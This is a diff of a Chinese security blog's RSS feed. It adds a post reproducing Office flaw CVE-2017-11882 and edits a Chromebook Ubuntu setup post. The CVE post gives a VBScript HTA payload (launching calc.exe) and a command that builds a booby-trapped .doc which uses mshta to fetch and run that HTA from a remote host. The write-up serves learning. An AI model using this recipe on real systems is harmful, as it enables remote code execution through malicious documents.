@@ -5,9 +5,76 @@
     <description>韬光养晦 厚积薄发</description>
     <link>https://havysec.github.io/</link>
     <atom:link href="https://havysec.github.io/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Mon, 30 Oct 2017 10:38:37 -0400</pubDate>
-    <lastBuildDate>Mon, 30 Oct 2017 10:38:37 -0400</lastBuildDate>
+    <pubDate>Sun, 26 Nov 2017 04:02:55 -0500</pubDate>
+    <lastBuildDate>Sun, 26 Nov 2017 04:02:55 -0500</lastBuildDate>
     <generator>Jekyll v3.1.1</generator>
+    
+      <item>
+        <title>内存泄漏漏洞复现(CVE-2017-11882-Memory Corruption Vulnerability)</title>
+        <description>&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/havysec/havysec.github.io/master/_posts/post_image/2017-11-26/vulnerability.png&quot; alt=&quot;vulnerability&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;cve-2017-11882-memory-corruption-vulnerability&quot;&gt;内容：内存泄漏漏洞复现(CVE-2017-11882-Memory Corruption Vulnerability)&lt;/h3&gt;
+&lt;p&gt;1、 利用文件制作&lt;br /&gt;
+2、 效果演示&lt;/p&gt;
+
+&lt;h3 id=&quot;xxxdoc&quot;&gt;xxx.doc制作步骤&lt;/h3&gt;
+
+&lt;p&gt;下载代码&lt;a href=&quot;https://github.com/Ridter/CVE-2017-11882&quot;&gt;github-Ridter&lt;/a&gt;到某linux系统上面，系统要有&lt;code class=&quot;highlighter-rouge&quot;&gt;apache&lt;/code&gt;服务&lt;/p&gt;
+
+&lt;p&gt;在服务器的&lt;code class=&quot;highlighter-rouge&quot;&gt;/var/www/html&lt;/code&gt;目录下生成&lt;code class=&quot;highlighter-rouge&quot;&gt;execute.hta&lt;/code&gt;(名字随意)文件&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;HTML&amp;gt;
+&amp;lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&amp;gt;
+&amp;lt;HEAD&amp;gt;
+&amp;lt;script language=&quot;VBScript&quot;&amp;gt;
+Window.ReSizeTo 0, 0
+Window.moveTo -2000,-2000
+Set objShell = CreateObject(&quot;Wscript.Shell&quot;)
+objShell.Run &quot;calc.exe&quot;
+self.close
+&amp;lt;/script&amp;gt;
+&amp;lt;body&amp;gt;
+demo
+&amp;lt;/body&amp;gt;
+&amp;lt;/HEAD&amp;gt;
+&amp;lt;/HTML&amp;gt;  
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;执行&lt;code class=&quot;highlighter-rouge&quot;&gt;python Command109b_CVE-2017-11882.py -c &quot;mshta http://192.168.176.129/execute.hta&quot; -o havy_109.doc&lt;/code&gt;得到利用文件&lt;/p&gt;
+
+&lt;p&gt;43b同上&lt;/p&gt;
+
+&lt;h3 id=&quot;controller&quot;&gt;controller效果&lt;/h3&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/havysec/havysec.github.io/master/_posts/post_image/2017-11-26/1.png&quot; alt=&quot;controller&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;section&quot;&gt;参考链接&lt;/h3&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://github.com/Ridter/CVE-2017-11882&quot;&gt;github-Ridter&lt;/a&gt; &lt;br /&gt;
+&lt;a href=&quot;https://github.com/embedi/CVE-2017-11882&quot;&gt;github-embedi&lt;/a&gt;&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;keep learning ！  –by myself&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+</description>
+        <pubDate>Sun, 26 Nov 2017 00:00:00 -0500</pubDate>
+        <link>https://havysec.github.io/2017/11/CVE-2017-11882-%E5%A4%8D%E7%8E%B0/</link>
+        <guid isPermaLink="true">https://havysec.github.io/2017/11/CVE-2017-11882-%E5%A4%8D%E7%8E%B0/</guid>
+        
+        <category>漏洞复现</category>
+        
+        
+      </item>
     
       <item>
         <title>Chromebook安装Ubuntu</title>
@@ -17,14 +84,14 @@
 
 &lt;h3 id=&quot;chromebookubuntu&quot;&gt;内容：chromebook入手后安装ubuntu&lt;/h3&gt;
 
-&lt;p&gt;今年5月份买的chromebook，买它是因为小、轻想着以后出门带着很方便。而且可以通过&lt;code class=&quot;highlighter-rouge&quot;&gt;Cronton&lt;/code&gt;安装ubuntu，这样就很爽了。&lt;/p&gt;
+&lt;p&gt;今年5月份买的&lt;code class=&quot;highlighter-rouge&quot;&gt;chromebook&lt;/code&gt;，买它是因为小、轻想着以后出门带着很方便。而且可以通过&lt;code class=&quot;highlighter-rouge&quot;&gt;Cronton&lt;/code&gt;安装&lt;code class=&quot;highlighter-rouge&quot;&gt;ubuntu&lt;/code&gt;，这样就很爽了。而且这款&lt;/p&gt;
 
 &lt;h3 id=&quot;section&quot;&gt;安装步骤(打开浏览器)&lt;/h3&gt;
 
 &lt;blockquote&gt;
-  &lt;p&gt;ctrl + alt + t 打开crosh &lt;br /&gt;
-crosh输入shell进入linux命令行 &lt;br /&gt;
-sudo su 进入root账户&lt;/p&gt;
+  &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ctrl + alt + t&lt;/code&gt; 打开&lt;code class=&quot;highlighter-rouge&quot;&gt;crosh&lt;/code&gt; &lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;crosh&lt;/code&gt;输入shell进入linux命令行 &lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;sudo su&lt;/code&gt; 进入&lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt;账户&lt;/p&gt;
 &lt;/blockquote&gt;
 
 &lt;blockquote&gt;
@@ -47,9 +114,11 @@ sudo su 进入root账户&lt;/p&gt;
 &lt;code class=&quot;highlighter-rouge&quot;&gt;bash main.sh -r list&lt;/code&gt; 会显示你的机器可以安装哪些linux系统 &lt;br /&gt;
 &lt;code class=&quot;highlighter-rouge&quot;&gt;bash main.sh -t list&lt;/code&gt; 会显示安装哪些基础程序如桌面等 &lt;br /&gt;
 &lt;code class=&quot;highlighter-rouge&quot;&gt;bash main.sh -r xenial -t core,x11,audio,cli-extra,extension,gtk-extra,kde&lt;/code&gt;  我开始安装的是这几个，但是浏览器不好用&lt;br /&gt;
-&lt;code class=&quot;highlighter-rouge&quot;&gt;bash main.sh -r trusty -t core,x11,audio,cli-extra,extension,gtk-extra,chromium,keyword,lxde,lxde-desktop&lt;/code&gt; 换了这个还没怎么用 &lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;bash main.sh -r xenial -t core,x11,audio,cli-extra,extension,gtk-extra,chromium,keyword,lxde,lxde-desktop&lt;/code&gt; 换了这个还没怎么用 &lt;br /&gt;
 &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo startlxde&lt;/code&gt; 即可打开安装好的Ubuntu&lt;br /&gt;
-&lt;code class=&quot;highlighter-rouge&quot;&gt;ctrl + alt + shift + f2/f1&lt;/code&gt; 快速切换ChromeOs/Ubunu&lt;/p&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;ctrl + alt + shift + f2/f1&lt;/code&gt; 快速切换ChromeOs/Ubunu&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;sudo startcli / sudo enter-chroot&lt;/code&gt;  可以类似于ssh登录Ubuntu&lt;br /&gt;
+写&lt;code class=&quot;highlighter-rouge&quot;&gt;python&lt;/code&gt;用&lt;code class=&quot;highlighter-rouge&quot;&gt;spyder&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;apt install spyder&lt;/code&gt;&lt;/p&gt;
 &lt;/blockquote&gt;
 
 &lt;hr /&gt;
